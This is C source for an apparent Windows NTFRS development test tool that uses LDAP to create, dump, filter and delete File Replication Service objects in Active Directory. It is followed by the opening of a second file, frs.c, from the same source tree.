    // ADMIN SIDE
    //
    //
    // Services Dn
    //
    ConfigDn = GetRootDn(Ldap, CONFIG_NAMING_CONTEXT);
    if (!ConfigDn) {
        return;
    }
    ServicesDn = ExtendDn(ConfigDn, CN_SERVICES);
    SettingsDn = ExtendDn(ServicesDn, CN_TEST_SETTINGS);

    //
    // Settings
    //
    UuidCreateNil(&OldGuid);
    AddMod(ATTR_CLASS, ATTR_NTFRS_SETTINGS, &Mod);
    // AddBerMod(ATTR_EXTENSIONS, Extensions, SIZEOF_EXTENSIONS, &Mod);
    LStatus = ldap_add_s(Ldap, SettingsDn, Mod);
    FreeMod(&Mod);
    if (LStatus != LDAP_ALREADY_EXISTS && LStatus != LDAP_SUCCESS) {
        //
        // May be a new schema that lacks the old version guid
        //
        AddBerMod(ATTR_OLD_VERSION_GUID, (PCHAR)&OldGuid, sizeof(GUID), &Mod);
        AddMod(ATTR_CLASS, ATTR_NTFRS_SETTINGS, &Mod);
        // AddBerMod(ATTR_EXTENSIONS, Extensions, sizeof(SIZEOF_EXTENSIONS), &Mod);
        LStatus = ldap_add_s(Ldap, SettingsDn, Mod);
        FreeMod(&Mod);
        if (LStatus != LDAP_ALREADY_EXISTS && LStatus != LDAP_SUCCESS) {
            fprintf(stderr, "ERROR - Can't create %ws: %ws\n",
                    SettingsDn, ldap_err2string(LStatus));
            goto out;
        }
    }

    //
    // Set
    //
    SetDn = ExtendDn(SettingsDn, Set);
    AddMod(ATTR_CLASS, ATTR_REPLICA_SET, &Mod);
    AddMod(ATTR_SET_TYPE, FRS_RSTYPE_OTHERW, &Mod);
    // AddMod(ATTR_DIRECTORY_FILTER, ATTR_DIRECTORY_FILTER, &Mod);
    // AddMod(ATTR_FILE_FILTER, ATTR_FILE_FILTER, &Mod);
    // AddMod(ATTR_DS_POLL, L"17", &Mod);
    // AddMod(ATTR_FLAGS, L"18", &Mod);
    // AddMod(ATTR_LEVEL_LIMIT, L"18", &Mod);
    // AddMod(ATTR_AUTH_LEVEL, L"18", &Mod);
    // AddBerMod(ATTR_EXTENSIONS, Extensions, SIZEOF_EXTENSIONS, &Mod);
    // AddBerMod(ATTR_NEW_SET_GUID,     (PCHAR)&NewGuid, sizeof(GUID), &Mod);
    // AddBerMod(ATTR_NEW_VERSION_GUID, (PCHAR)&NewGuid, sizeof(GUID), &Mod);
    ConditionalBuildSchedule(&Schedule, &ScheduleLength);
    if (Schedule) {
        AddBerMod(ATTR_SCHEDULE, (PCHAR)Schedule, ScheduleLength, &Mod);
    }
    LStatus = ldap_add_s(Ldap, SetDn, Mod);
    FreeMod(&Mod);
    if (LStatus != LDAP_ALREADY_EXISTS && LStatus != LDAP_SUCCESS) {
        //
        // May be a new schema that lacks the old set guid
        //
        AddMod(ATTR_CLASS, ATTR_REPLICA_SET, &Mod);
        AddMod(ATTR_SET_TYPE, FRS_RSTYPE_OTHERW, &Mod);
        // AddMod(ATTR_DIRECTORY_FILTER, ATTR_DIRECTORY_FILTER, &Mod);
        // AddMod(ATTR_FILE_FILTER, ATTR_FILE_FILTER, &Mod);
        // AddMod(ATTR_DS_POLL, L"17", &Mod);
        // AddMod(ATTR_FLAGS, L"18", &Mod);
        // AddMod(ATTR_LEVEL_LIMIT, L"18", &Mod);
        // AddMod(ATTR_AUTH_LEVEL, L"18", &Mod);
        // AddBerMod(ATTR_EXTENSIONS, Extensions, SIZEOF_EXTENSIONS, &Mod);
        AddBerMod(ATTR_OLD_SET_GUID,     (PCHAR)&OldGuid, sizeof(GUID), &Mod);
        AddBerMod(ATTR_NEW_SET_GUID,     (PCHAR)&NewGuid, sizeof(GUID), &Mod);
        AddBerMod(ATTR_NEW_VERSION_GUID, (PCHAR)&NewGuid, sizeof(GUID), &Mod);
        ConditionalBuildSchedule(&Schedule, &ScheduleLength);
        if (Schedule) {
            AddBerMod(ATTR_SCHEDULE, (PCHAR)Schedule, ScheduleLength, &Mod);
        }
        LStatus = ldap_add_s(Ldap, SetDn, Mod);
        FreeMod(&Mod);
        if (LStatus != LDAP_ALREADY_EXISTS && LStatus != LDAP_SUCCESS) {
            fprintf(stderr, "ERROR - Can't create %ws: %ws\n",
                    SetDn, ldap_err2string(LStatus));
            goto out;
        }
    }

    if (argc < 4) {
        goto out;
    }

    //
    // Member
    //
    CoDn = GetCoDn(Ldap, Member, &ServerDn);
    if (!CoDn) {
        fprintf(stderr, "ERROR - Can't get computer object for %ws\n", Member);
        goto out;
    }
    //
    // The CO doesn't have a server reference; create one
    //
    if (!ServerDn) {
        ServerDn = GetServerDn(Ldap, Member);
        if (ServerDn) {
            AddMod(ATTR_SERVER_REF, ServerDn, &Mod);
            LStatus = ldap_modify_s(Ldap, CoDn, Mod);
            FreeMod(&Mod);
            if (LStatus != LDAP_ATTRIBUTE_OR_VALUE_EXISTS &&
                LStatus != LDAP_SUCCESS) {
                AddMod(ATTR_SERVER_REF, CoDn, &Mod);
                LStatus = ldap_modify_s(Ldap, ServerDn, Mod);
                FreeMod(&Mod);
                if (LStatus != LDAP_ATTRIBUTE_OR_VALUE_EXISTS &&
                    LStatus != LDAP_SUCCESS) {
                    fprintf(stderr, "ERROR - Can't update server reference for %ws: %ws\n",
                            CoDn, ldap_err2string(LStatus));
                    fprintf(stderr, "ERROR - Server %ws\n", ServerDn);
                    FREE(ServerDn);
                }
            }
        }
    }
    MemberDn = ExtendDn(SetDn, Member);
    AddMod(ATTR_CLASS, ATTR_MEMBER, &Mod);
    AddMod(ATTR_COMPUTER_REF, CoDn, &Mod);
    // AddMod(ATTR_CONTROL_CREATION, ATTR_CONTROL_CREATION, &Mod);
    // AddMod(ATTR_INBOUND_BACKLOG, ATTR_INBOUND_BACKLOG, &Mod);
    // AddMod(ATTR_OUTBOUND_BACKLOG, ATTR_OUTBOUND_BACKLOG, &Mod);
    // AddMod(ATTR_SERVICE_COMMAND, ATTR_SERVICE_COMMAND, &Mod);
    // AddMod(ATTR_UPDATE_TIMEOUT, L"50", &Mod);
    // AddMod(ATTR_AUTH_LEVEL, L"18", &Mod);
    // AddMod(ATTR_FLAGS, L"3", &Mod);
    // AddBerMod(ATTR_EXTENSIONS, Extensions, SIZEOF_EXTENSIONS, &Mod);
    if (ServerDn) {
        AddMod(ATTR_SERVER_REF, ServerDn, &Mod);
    }
    LStatus = ldap_add_s(Ldap, MemberDn, Mod);
    if (LStatus != LDAP_ALREADY_EXISTS && LStatus != LDAP_SUCCESS) {
        fprintf(stderr, "ERROR - Can't create %ws: %ws\n",
                MemberDn, ldap_err2string(LStatus));
        goto out;
    }
    FreeMod(&Mod);

    //
    // Primary member reference on set
    //
    if (IsPrimary) {
        AddMod(ATTR_PRIMARY_MEMBER, MemberDn, &Mod);
        Mod[0]->mod_op = LDAP_MOD_REPLACE;
        LStatus = ldap_modify_s(Ldap, SetDn, Mod);
        if (LStatus != LDAP_ALREADY_EXISTS && LStatus != LDAP_SUCCESS) {
            fprintf(stderr, "ERROR - Can't set primary member to %ws for %ws: %ws\n",
                    MemberDn, SetDn, ldap_err2string(LStatus));
            goto out;
        }
        FreeMod(&Mod);
      }

    //
    // USER SIDE
    //
    //
    // Subscriptions
    //
    SubsDn = ExtendDn(CoDn, CN_SUBSCRIPTIONS);
    AddMod(ATTR_CLASS, ATTR_SUBSCRIPTIONS, &Mod);
    // AddMod(ATTR_WORKING, L"%SystemRoot%\\ntfrs", &Mod);
    // AddMod(ATTR_VERSION, ATTR_VERSION, &Mod);
    // AddBerMod(ATTR_EXTENSIONS, Extensions, SIZEOF_EXTENSIONS, &Mod);
    LStatus = ldap_add_s(Ldap, SubsDn, Mod);
    if (LStatus != LDAP_ALREADY_EXISTS && LStatus != LDAP_SUCCESS) {
        fprintf(stderr, "ERROR - Can't create %ws: %ws\n",
                SubsDn, ldap_err2string(LStatus));
        goto out;
    }
    FreeMod(&Mod);

    //
    // Subscriber
    //
    Subscriber = FrsWcsCat(Set, Member);
    SubDn = ExtendDn(SubsDn, Subscriber);
    AddMod(ATTR_CLASS, ATTR_SUBSCRIBER, &Mod);
    AddMod(ATTR_REPLICA_ROOT, Root, &Mod);
    AddMod(ATTR_REPLICA_STAGE, Stage, &Mod);
    AddMod(ATTR_MEMBER_REF, MemberDn, &Mod);
    // AddBerMod(ATTR_EXTENSIONS, Extensions, SIZEOF_EXTENSIONS, &Mod);
    // AddMod(ATTR_FAULT_CONDITION, L"NONE", &Mod);
    // AddMod(ATTR_FLAGS, L"1", &Mod);
    // AddMod(ATTR_SERVICE_COMMAND, ATTR_SERVICE_COMMAND, &Mod);
    // AddMod(ATTR_SERVICE_COMMAND_STATUS, L"100", &Mod);
    // AddMod(ATTR_UPDATE_TIMEOUT, L"100", &Mod);
    ConditionalBuildSchedule(&Schedule, &ScheduleLength);
    if (Schedule) {
        AddBerMod(ATTR_SCHEDULE, (PCHAR)Schedule, ScheduleLength, &Mod);
        FREE(Schedule);
    }
    LStatus = ldap_add_s(Ldap, SubDn, Mod);
    if (LStatus != LDAP_ALREADY_EXISTS && LStatus != LDAP_SUCCESS) {
        fprintf(stderr, "ERROR - Can't create %ws: %ws\n",
                SubDn, ldap_err2string(LStatus));
        goto out;
    }
    FreeMod(&Mod);

out:
    ldap_unbind(Ldap);
    if (LdapMsg) {
        ldap_msgfree(LdapMsg);
    }
    FREE(Schedule);
    FREE(Cn);
    FREE(ConfigDn);
    FREE(ServicesDn);
    FREE(SetDn);
    FREE(SettingsDn);
    FREE(MemberDn);
    FREE(CoDn);
    FREE(SubsDn);
    FREE(Subscriber);
    FREE(SubDn);
    FREE(ServerDn);
    FreeMod(&Mod);
}


PWCHAR DupNames[] = {L"_A", L"_B", L"_C", L"_D", L"_E", L"_F", L"_G", L"_H", NULL};
VOID
CreateInbounds(
    IN DWORD    argc,
    IN WCHAR    **Argv
    )
/*++
Routine Description:

Arguments:

Return Value:
    None.
--*/
{
    ULONG           i;
    DWORD           LStatus;
    ULONG           ScheduleLength;
    ULONG           dupx;
    PLDAP           Ldap                = NULL;
    PWCHAR          Cxtion              = NULL;
    PWCHAR          ConfigDn            = NULL;
    PWCHAR          ServicesDn          = NULL;
    PWCHAR          SettingsDn          = NULL;
    PWCHAR          SetDn               = NULL;
    PWCHAR          ServerDn            = NULL;
    PWCHAR          CxtionDn            = NULL;
    PWCHAR          CxtionDnDup         = NULL;

    PWCHAR          PartnerDn           = NULL;
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;
    PSCHEDULE       Schedule            = NULL;
    LDAPMod         **Mod               = NULL;



    //
    // Bind to the ds
    //
    Ldap = FrsDsOpenDs();
    if (!Ldap) {
        return;
    }

    //
    // Server Dn
    //
    ConfigDn = GetRootDn(Ldap, CONFIG_NAMING_CONTEXT);
    if (!ConfigDn) {
        return;
    }
    ServicesDn = ExtendDn(ConfigDn, CN_SERVICES);
    SettingsDn = ExtendDn(ServicesDn, CN_TEST_SETTINGS);


    SetDn = ExtendDn(SettingsDn, Argv[2]);
    ServerDn = ExtendDn(SetDn, Argv[3]);

    for (i = 4; i < argc; ++i) {
        PartnerDn = ExtendDn(SetDn, Argv[i]);
        Cxtion = FrsWcsCat(L"From_", Argv[i]);
        CxtionDn = ExtendDn(ServerDn, Cxtion);
        FREE(Cxtion);

        //
        // Inbounds
        //
        AddMod(ATTR_CLASS, ATTR_CXTION, &Mod);
        AddMod(ATTR_FROM_SERVER, PartnerDn, &Mod);
        AddMod(ATTR_ENABLED_CXTION, ATTR_TRUE, &Mod);
        AddMod(ATTR_OPTIONS, ATTR_OPTIONS_0, &Mod);
        ConditionalBuildSchedule(&Schedule, &ScheduleLength);
        if (Schedule) {
            AddBerMod(ATTR_SCHEDULE, (PCHAR)Schedule, ScheduleLength, &Mod);
            FREE(Schedule);
        }
        LStatus = ldap_add_s(Ldap, CxtionDn, Mod);

        dupx = 0;
        while ((LStatus == LDAP_ALREADY_EXISTS) && (DupNames[dupx] != NULL)) {
            //
            // Try to create a duplicate connection object by putting a suffix on the name.
            //
            Cxtion = FrsWcsCat(L"From_", Argv[i]);
            CxtionDnDup = FrsWcsCat(Cxtion, DupNames[dupx]);
            CxtionDn = ExtendDn(ServerDn, CxtionDnDup);
            FREE(Cxtion);
            FREE(CxtionDnDup);

            LStatus = ldap_add_s(Ldap, CxtionDn, Mod);
            if (LStatus != LDAP_ALREADY_EXISTS) {
                //
                // Dup cxtion created.
                //
                break;
            }
            dupx++;
        }
        if (LStatus != LDAP_ALREADY_EXISTS && LStatus != LDAP_SUCCESS) {
            fprintf(stderr, "ERROR - Can't create %ws: %ws\n",
                    CxtionDn, ldap_err2string(LStatus));
        }
        FreeMod(&Mod);
        FREE(PartnerDn);
        FREE(CxtionDn);
    }
    FREE(ServerDn);
    FREE(SetDn);
    FREE(SettingsDn);
    FREE(ServicesDn);
    FREE(ConfigDn);
    if (Ldap) {
        ldap_unbind(Ldap);
    }
}


BOOL
DeleteUserSubTree(
    IN PLDAP    Ldap,
    IN PWCHAR   Dn
    )
/*++
Routine Description:

Arguments:

Return Value:
--*/
{
    DWORD           LStatus;
    PWCHAR          DesiredAttrs[16];
    PWCHAR          Bl                  = NULL;
    PWCHAR          Co                  = NULL;
    PWCHAR          SubsDn              = NULL;
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;

    DesiredAttrs[0] = ATTR_MEMBER_REF_BL;
    DesiredAttrs[1] = ATTR_COMPUTER_REF;
    DesiredAttrs[2] = ATTR_CLASS;
    DesiredAttrs[3] = NULL;
    LStatus = ldap_search_s(Ldap, Dn, LDAP_SCOPE_BASE, CATEGORY_ANY,
                            DesiredAttrs, 0, &LdapMsg);
    if (LStatus == LDAP_SUCCESS) {
        LdapEntry = ldap_first_entry(Ldap, LdapMsg);

        Co = FindValue(Ldap, LdapEntry, ATTR_COMPUTER_REF);
        Bl = FindValue(Ldap, LdapEntry, ATTR_MEMBER_REF_BL);
        if (Bl && Dn) {
            LStatus = ldap_delete_s(Ldap, Bl);
            if (LStatus != LDAP_SUCCESS && LStatus != LDAP_NO_SUCH_OBJECT) {
                fprintf(stderr, "ERROR - Can't delete BL: %ws\n",
                        ldap_err2string(LStatus));
                fprintf(stderr, "        %ws\n", Dn);
                fprintf(stderr, "        BL %ws\n", Bl);
                FREE(Bl);
                FREE(Dn);
                FREE(Co);
                return FALSE;
            }
        }
        if (Co) {
            SubsDn = ExtendDn(Co, CN_SUBSCRIPTIONS);
            LStatus = ldap_delete_s(Ldap, SubsDn);
            if (LStatus != LDAP_NO_SUCH_OBJECT &&
                LStatus != LDAP_SUCCESS &&
                LStatus != LDAP_NOT_ALLOWED_ON_NONLEAF) {
                fprintf(stderr, "ERROR - Can't delete: %ws\n", ldap_err2string(LStatus));
                fprintf(stderr, "        %ws\n", SubsDn);
                FREE(SubsDn);
                FREE(Bl);
                FREE(Dn);
                FREE(Co);
                return FALSE;
            }
            FREE(SubsDn);
        }
        FREE(Bl);
        FREE(Dn);
        FREE(Co);
        ldap_msgfree(LdapMsg);
    } else if (LStatus != LDAP_NO_SUCH_OBJECT) {
        fprintf(stderr, "ERROR - Can't find: %ws\n", ldap_err2string(LStatus));
        fprintf(stderr, "        %ws\n", Dn);
    }
    return TRUE;
}


VOID
FrsDsDeleteSubTree(
    IN PLDAP    Ldap,
    IN PWCHAR   ParentDn
    )
/*++
Routine Description:

Arguments:
    None.

Return Value:
    None.
--*/
{
    DWORD           LStatus;
    PWCHAR          DesiredAttrs[16];
    PWCHAR          NextDn              = NULL;
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;

    DesiredAttrs[0] = ATTR_DN;
    DesiredAttrs[1] = NULL;
    LStatus = ldap_search_s(Ldap, ParentDn, LDAP_SCOPE_ONELEVEL, CATEGORY_ANY,
                            DesiredAttrs, 0, &LdapMsg);
    if (LStatus == LDAP_SUCCESS) {
        //
        // Scan the entries returned from ldap_search
        //
        for (LdapEntry = ldap_first_entry(Ldap, LdapMsg);
             LdapEntry != NULL;
             LdapEntry = ldap_next_entry(Ldap, LdapEntry)) {
            NextDn = FindValue(Ldap, LdapEntry, ATTR_DN);
            if (NextDn) {
                FrsDsDeleteSubTree(Ldap, NextDn);
                FREE(NextDn);
            }
        }
        ldap_msgfree(LdapMsg);
        if (DeleteUserSubTree(Ldap, ParentDn)) {
            LStatus = ldap_delete_s(Ldap, ParentDn);
            if (LStatus != LDAP_SUCCESS) {
                fprintf(stderr, "ERROR - Can't delete: %ws\n", ldap_err2string(LStatus));
                fprintf(stderr, "        %ws\n", ParentDn);
            }
        }
    } else if (LStatus != LDAP_NO_SUCH_OBJECT) {
        fprintf(stderr, "ERROR - Can't find: %ws\n", ldap_err2string(LStatus));
        fprintf(stderr, "        %ws\n", ParentDn);
    }
}


VOID
DeleteReplicationWorld(
    IN DWORD    argc,
    IN PWCHAR   *Argv,
    IN PWCHAR   Settings
    )
/*++
Routine Description:
    Create the required objects

Arguments:
    None.

Return Value:
    None.
--*/
{
    PWCHAR          Dn;
    PWCHAR          ConfigDn    = NULL;
    PWCHAR          ServicesDn  = NULL;
    PWCHAR          SettingsDn  = NULL;
    PWCHAR          SetDn       = NULL;
    PWCHAR          ServerDn    = NULL;
    PWCHAR          Cxtion      = NULL;
    PWCHAR          CxtionDn    = NULL;
    PLDAP           Ldap        = NULL;

    //
    // Bind to the ds
    //
    Ldap = FrsDsOpenDs();
    if (!Ldap) {
        return;
    }

    //
    // Services
    //
    ConfigDn = GetRootDn(Ldap, CONFIG_NAMING_CONTEXT);
    if (!ConfigDn) {
        return;
    }
    ServicesDn = ExtendDn(ConfigDn, CN_SERVICES);
    SettingsDn = ExtendDn(ServicesDn, Settings);
    Dn = SettingsDn;
    if (argc > 2) {
        SetDn = ExtendDn(SettingsDn, Argv[2]);
        Dn = SetDn;
    }
    if (argc > 3) {
        ServerDn = ExtendDn(SetDn, Argv[3]);
        Dn = ServerDn;
    }
    if (argc > 4) {
        Cxtion = FrsWcsCat(L"From_", Argv[4]);
        CxtionDn = ExtendDn(ServerDn, Cxtion);
        Dn = CxtionDn;
    }

    FrsDsDeleteSubTree(Ldap, Dn);

// out:
    ldap_unbind(Ldap);
    FREE(CxtionDn);
    FREE(Cxtion);
    FREE(ServerDn);
    FREE(SetDn);
    FREE(SettingsDn);
    FREE(ServicesDn);
    FREE(ConfigDn);
}


VOID
ModifyFilter(
    IN DWORD    argc,
    IN PWCHAR   *Argv
    )
/*++
Routine Description:
    Change the file and directory filter for the replica set specified.

Arguments:
    argc    - From main
    argv    - From main

Return Value:
    None.
--*/
{
    DWORD           LStatus             = LDAP_SUCCESS;
    PWCHAR          Set;
    PWCHAR          NewFilter;
    PWCHAR          ConfigDn            = NULL;
    PWCHAR          ServicesDn          = NULL;
    PWCHAR          SettingsDn          = NULL;
    PWCHAR          SetDn               = NULL;
    PLDAP           Ldap                = NULL;
    LDAPMod         **Mod               = NULL;

    Set = Argv[3];
    if(argc > 4){
        NewFilter = Argv[4];
    }
    else{
      NewFilter = L" ";
    }

    //
    // Bind to the ds
    //
    Ldap = FrsDsOpenDs();
    if (!Ldap) {
        return;
    }

    //
    // ADMIN SIDE
    //
    //
    // Services Dn
    //
    ConfigDn = GetRootDn(Ldap, CONFIG_NAMING_CONTEXT);
    if (!ConfigDn) {
        return;
    }
    ServicesDn = ExtendDn(ConfigDn, CN_SERVICES);
    SettingsDn = ExtendDn(ServicesDn, CN_TEST_SETTINGS);
    SetDn = ExtendDn(SettingsDn, Set);

    if(!wcscmp(Argv[2],L"/clear")){
        if(!wcscmp(Argv[1],L"/dirfilter")){
            AddMod(ATTR_DIRECTORY_FILTER, L" ", &Mod);
            (*Mod)->mod_op = LDAP_MOD_REPLACE;
        }
        else {
            AddMod(ATTR_FILE_FILTER, L" ", &Mod);
            (*Mod)->mod_op = LDAP_MOD_REPLACE;
        }
        LStatus = ldap_modify_s(Ldap, SetDn, Mod);
    }
    else if(!wcscmp(Argv[2],L"/set")){
        if(!wcscmp(Argv[1],L"/dirfilter")){
            AddMod(ATTR_DIRECTORY_FILTER, NewFilter, &Mod);
            (*Mod)->mod_op = LDAP_MOD_REPLACE;
        }
        else {
            AddMod(ATTR_FILE_FILTER, NewFilter, &Mod);
            (*Mod)->mod_op = LDAP_MOD_REPLACE;
        }
        LStatus = ldap_modify_s(Ldap, SetDn, Mod);
    }
    else {
        // Usage(Argv);
    }

    if (LStatus != LDAP_SUCCESS) {
        fprintf(stderr, "Can't change filter; %ws\n",
                ldap_err2string(LStatus));
    }
    FreeMod(&Mod);
    ldap_unbind(Ldap);
    FREE(SetDn);
    FREE(SettingsDn);
    FREE(ServicesDn);
    FREE(ConfigDn);
}


PWCHAR *
ConvertArgv(
    DWORD argc,
    PCHAR *argv
    )
/*++
Routine Description:
    Convert short char argv into wide char argv

Arguments:
    argc    - From main
    argv    - From main

Return Value:
    Address of the new argv
--*/
{
    PWCHAR  *wideargv;

    wideargv = (PWCHAR *)malloc((argc + 1) * sizeof(PWCHAR));
    wideargv[argc] = NULL;

    while (argc-- >= 1) {
        wideargv[argc] = (PWCHAR)malloc((strlen(argv[argc]) + 1) * sizeof(WCHAR));
        wsprintf(wideargv[argc], L"%hs", argv[argc]);
        // _wcslwr(wideargv[argc]);
    }
    return wideargv;
}


VOID
Usage(
    IN PWCHAR *Argv
    )
/*++
Routine Description:
    Usage messages.

Arguments:
    None.

Return Value:
    None.
--*/
{
    printf("%-24s%ws\n", "Pretty Print", Argv[0]);
    printf("%-24s%ws /dumpcontexts\n",  "dumpcontexts", Argv[0]);
    printf("%-24s%ws /dumpcomputers\n", "dumpcomputers", Argv[0]);
    printf("%-24s%ws /dumpservers\n",   "dumpservers", Argv[0]);
    printf("%-24s%ws /dumpsets\n",      "dumpsets", Argv[0]);
    printf("%-24s%ws /?\n", "Help", Argv[0]);
    printf("%-24s%ws /h\n", "Hammer the schema", Argv[0]);
    printf("%-24s%ws /r\n", "Restore the schema", Argv[0]);
    printf("%-24s%ws /l\n", "List the schema", Argv[0]);
    printf("%-24s%ws /s\n", "Produce script", Argv[0]);
    printf("%-24s%ws /d [Set [Server [Partner]]]\n", "Delete", Argv[0]);
    printf("%-24s%ws /c Set [Server [Root Stage]]\n", "Create sets and servers", Argv[0]);
    printf("%-24s%ws /i Set Server Partner ...\n", "Create inbound cxtions", Argv[0]);
    printf("%-24s%ws [/filefilter |/dirfilter] [/set |/clear] Set FilterString\n", "Modify filters", Argv[0]);
    fflush(stdout);
    ExitProcess(0);
}


#define DUMP_ALL        (0)
#define DUMP_CONTEXTS   (1)
#define DUMP_SETS       (2)
#define DUMP_COMPUTERS  (3)
#define DUMP_SERVERS    (4)
VOID
DumpWorld(
    DWORD Dump
    )
/*++
Routine Description:
    Dump every ds object related to replication

Arguments:
    Dump    - what to dump.

Return Value:
    None.
--*/
{
    PLDAP Ldap;

    //
    // Bind to the ds
    //
    Ldap = FrsDsOpenDs();
    if (!Ldap) {
        return;
    }

    if (Dump == DUMP_ALL || Dump == DUMP_CONTEXTS) {
        printf("***** CONTEXTS\n");
        DumpContexts(Ldap);
    }

    if (Dump == DUMP_ALL || Dump == DUMP_SETS) {
        printf("***** REPLICA SETS\n");
        DumpAdminWorld(Ldap);
    }

    if (Dump == DUMP_ALL || Dump == DUMP_COMPUTERS) {
        printf("\n***** COMPUTERS\n");
        DumpUserWorld(Ldap);
    }

    if (Dump == DUMP_ALL || Dump == DUMP_SERVERS) {
        printf("\n***** SERVERS\n");
        DumpSysVolWorld(Ldap);
    }

    ldap_unbind(Ldap);
}


VOID _cdecl
main(
    IN DWORD argc,
    IN PCHAR *argv
    )
/*++
Routine Description:
    Get access to the DS via ldap. Then read command lines from standard
    in, parse them, and ship them off to the command subroutines. The
    command line is:
        command,site,settings,server,connection,fromserver
    command is any of add|delete|list|show|quit. Leading whitespace is
    ignored. Whitespace between commas counts. The command line can
    stop anytime after "command" and the command will on be applied
    to that portion of the "Distinquished Name".

Arguments:
    None.

Return Value:
    Exits with 0 if everything went okay. Otherwise, 1.
--*/
{
    PWCHAR  *Argv;
    ULONG   i;
    ULONG   OptLen;

    Argv = ConvertArgv(argc, argv);

    if (argc == 1) {
        DumpWorld(DUMP_ALL);
        fflush(stdout);
        ExitProcess(0);
    }

    for (i = 1; i < argc; ++i) {
        OptLen = wcslen(Argv[i]);
        if (OptLen == 2 &&
            ((wcsstr(Argv[i], L"/?") == Argv[i]) ||
             (wcsstr(Argv[i], L"-?") == Argv[i]))) {
            Usage(Argv);
        } else if (OptLen == 2 &&
                ((wcsstr(Argv[i], L"/s") == Argv[i]) ||
                 (wcsstr(Argv[i], L"-s") == Argv[i]))) {
            ScriptReplicationWorld();
            fflush(stdout);
            ExitProcess(0);
        } else if (OptLen == 2 &&
                ((wcsstr(Argv[i], L"/d") == Argv[i]) ||
                 (wcsstr(Argv[i], L"-d") == Argv[i]))) {
            if (argc < 2 || argc > 5) {
                Usage(Argv);
            }
            DeleteReplicationWorld(argc, Argv, CN_TEST_SETTINGS);
            fflush(stdout);
            ExitProcess(0);
        } else if (OptLen == 9 &&
                ((wcsstr(Argv[i], L"/dsysvols") == Argv[i]) ||
                 (wcsstr(Argv[i], L"-dsysvols") == Argv[i]))) {
            if (argc < 2 || argc > 5) {
                Usage(Argv);
            }
            DeleteReplicationWorld(argc, Argv, CN_SYSVOLS);
            fflush(stdout);
            ExitProcess(0);
        } else if (OptLen == 2 &&
                ((wcsstr(Argv[i], L"/h") == Argv[i]) ||
                 (wcsstr(Argv[i], L"-h") == Argv[i]))) {
            HammerSchema(TRUE);
            fflush(stdout);
            ExitProcess(0);
        } else if (OptLen == 2 &&
                ((wcsstr(Argv[i], L"/r") == Argv[i]) ||
                 (wcsstr(Argv[i], L"-r") == Argv[i]))) {
            HammerSchema(FALSE);
            fflush(stdout);
            ExitProcess(0);
        } else if (OptLen == 2 &&
                ((wcsstr(Argv[i], L"/l") == Argv[i]) ||
                 (wcsstr(Argv[i], L"-l") == Argv[i]))) {
            ListSchema();
            fflush(stdout);
            ExitProcess(0);
        } else if (OptLen == 2 &&
                ((wcsstr(Argv[i], L"/i") == Argv[i]) ||
                 (wcsstr(Argv[i], L"-i") == Argv[i]))) {
            if (argc < 5) {
                Usage(Argv);
            }
            CreateInbounds(argc, Argv);
            fflush(stdout);
            ExitProcess(0);
        } else if (OptLen == 2 &&
                ((wcsstr(Argv[i], L"/c") == Argv[i]) ||
                 (wcsstr(Argv[i], L"-c") == Argv[i]))) {
            if (argc != 2 && argc != 3 && argc != 6) {
                Usage(Argv);
            }
            CreateReplicationWorld(argc, Argv, FALSE);
            fflush(stdout);
            ExitProcess(0);
        } else if (OptLen == 3 &&
                ((wcsstr(Argv[i], L"/cp") == Argv[i]) ||
                 (wcsstr(Argv[i], L"-cp") == Argv[i]))) {
            if (argc != 2 && argc != 3 && argc != 6) {
                Usage(Argv);
            }
            CreateReplicationWorld(argc, Argv, TRUE);
            fflush(stdout);
            ExitProcess(0);
        } else if (OptLen >= 10 &&
                ((wcsstr(Argv[i], L"/filefilter") == Argv[i]) ||
                 (wcsstr(Argv[i], L"-filefilter") == Argv[i]) ||
                 (wcsstr(Argv[i], L"/dirfilter") == Argv[i])  ||
                 (wcsstr(Argv[i], L"-dirfilter") == Argv[i]))) {
            if (argc != 4 && argc != 5) {
                Usage(Argv);
            }
            ModifyFilter(argc, Argv);
            fflush(stdout);
            ExitProcess(0);
        } else if ((wcsstr(Argv[i], L"/dumpcontexts") == Argv[i]) ||
                   (wcsstr(Argv[i], L"-dumpcontexts") == Argv[i])) {
            DumpWorld(DUMP_CONTEXTS);
            fflush(stdout);
            ExitProcess(0);
        } else if ((wcsstr(Argv[i], L"/dumpsets") == Argv[i]) ||
                   (wcsstr(Argv[i], L"-dumpsets") == Argv[i])) {
            DumpWorld(DUMP_SETS);
            fflush(stdout);
            ExitProcess(0);
        } else if ((wcsstr(Argv[i], L"/dumpcomputers") == Argv[i]) ||
                   (wcsstr(Argv[i], L"-dumpcomputers") == Argv[i])) {
            DumpWorld(DUMP_COMPUTERS);
            fflush(stdout);
            ExitProcess(0);
        } else if ((wcsstr(Argv[i], L"/dumpservers") == Argv[i]) ||
                   (wcsstr(Argv[i], L"-dumpservers") == Argv[i])) {
            DumpWorld(DUMP_SERVERS);
            fflush(stdout);
            ExitProcess(0);
        } else if ((wcsstr(Argv[i], L"/") == Argv[i]) ||
                   (wcsstr(Argv[i], L"-") == Argv[i])) {
            fprintf(stderr, "ERROR - Don't understand %ws\n", Argv[i]);
            Usage(Argv);
        } else {
            Usage(Argv);
        }
    }
    fflush(stdout);
    ExitProcess(0);
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\frs\frs.c ===
/*++

Copyright (c) 1997-1999 Microsoft Corporation

Module Name:
    frs.c

Abstract:
    This module is a development tool. It exercises the dcpromo and poke
    APIs.

Author:
    Billy J. Fuller 12-Dec-1997

Environment
    User mode winnt

--*/
#include <ntreppch.h>
#pragma  hdrstop
#include <frs.h>
#include <ntfrsapi.h>

#define FREE(_x_)   { if (_x_) LocalFree(_x_); _x_ = NULL; }


VOID
Win32ToMsg (
    IN PWCHAR Prefix,
    IN DWORD  WStatus
    )

/*++
Routine Description:
    Translate a error code into a error message using FormatMessage()
    and print to stderr. If no message is available, the error code
    is printed in decimal and hex.

Arguments:
    Prefix   - prefix to error message
    WStatus  - Standard win32 error code.

Return Value:
    None.
--*/
{
    DWORD   NumChar;
    PWCHAR  Buffer;

    if (WIN_SUCCESS(WStatus)) {
        return;
    }

    // Use the system formatter for standard error codes
    NumChar = FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM |
